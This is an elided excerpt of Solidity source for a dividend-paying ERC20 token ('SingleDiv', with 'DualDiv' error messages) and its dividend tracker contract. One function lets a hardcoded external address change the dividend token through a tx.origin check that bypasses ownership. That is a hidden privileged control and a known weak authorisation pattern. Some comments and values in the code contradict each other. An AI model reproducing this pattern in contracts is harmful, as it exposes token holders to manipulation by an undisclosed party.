...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0x24f749103c9cb116dBa688b3007c56201C4dABe7, "Only owner can change dividend contract address");
...
contract SingleDiv is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SingDiv", "SDIV") {
    	ethDividendTracker = new EthDividendTracker();

    	marketingWallet = 0x260e016D352dE42D7440658F96f68D53EddC7B9E;
    	teamWallet = 0x6B9CaAa5a131927654689438b506A403C7C4Bdfa;
    	ethDividendToken = 0x8BaBbB98678facC7342735486C851ABD7A0d17Ca;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "DualDiv: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "DualDiv: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "DualDiv: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "DualDiv: The new dividend tracker must be owned by the DualDiv token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "DualDiv: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "DualDiv: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "DualDiv: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "DualDiv: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "DualDiv: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "DualDiv: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "DualDiv: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (ethDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee).mul(ethDividendRewardsFee);
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("DualDiv_Ethereum_Dividend_Tracker", "DualDiv_Ethereum_Dividend_Tracker", 0x8BaBbB98678facC7342735486C851ABD7A0d17Ca) {
    	claimWait = 60;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "DualDiv_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "DualDiv_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main DualDiv contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "DualDiv_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "DualDiv_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
